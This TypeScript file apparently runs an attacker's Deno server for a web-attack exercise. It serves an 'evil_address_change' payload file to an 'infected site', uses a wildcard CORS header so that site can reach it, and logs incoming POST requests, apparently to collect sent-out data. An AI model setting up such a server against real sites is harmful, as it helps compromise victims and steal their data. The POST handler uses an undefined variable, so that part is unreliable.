
/* this is for completeness, how you'd get the body and headers of a request

const url = new URL(req.url);
console.log("Path:", url.pathname);
console.log("Query parameters:", url.searchParams);

console.log("Headers:", req.headers);

if (req.body) {
    const body = await req.text();
    console.log("Body:", body);
}

return new Response("Hello, World!");
*/


async function handleGetRequest(req: Request) {
    const url = new URL(req.url);
    const path = url.pathname;
    if (path === "/evil_address_change") {
        const evilFile = await Deno.readTextFileSync("./evil_address_change.php")

        return new Response(evilFile, {
            headers: {
                "Content-Type": "text/html",
            },
        });
    }


    console.log("GET Request. URL: " + req.url + " body: " + req.body + " params: " + url.searchParams + " pathname: " + path)
    return new Response("No one here but us chickens", {
        headers: { // NEEDED for the CORS policy on the infected site
            "Content-Type": "text/html",
            "Access-Control-Allow-Origin": "*",
        },
    });
}

async function handlePostRequest(req: Request) {
    console.log("Evil got new POST request")
    const url = new URL(req.url);

    console.log("POST Request. URL: " + req.url + " body: " + req.body + " params: " + url.searchParams + " pathname: " + path)

    return new Response("No one here but us chickens");
}

Deno.serve({ port: 80 }, async (req) => {

    try {
    
        if (req.method === "GET") {
            return await handleGetRequest(req)
        }
        else if (req.method === "POST") {
            return await handlePostRequest(req)
        }
    } catch (e) {
        
        const errorHtml =
        `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
        </head>
        <body>
            <h1>Error</h1>
            <p>There was an error processing your request. Please try again later.</p>
            <p>${e}</p>
        </body>
        </html>
        `


        return new Response(errorHtml, {
            status: 500,
            headers: {
                "Content-Type": "text/html",
            },
        })
    }


    });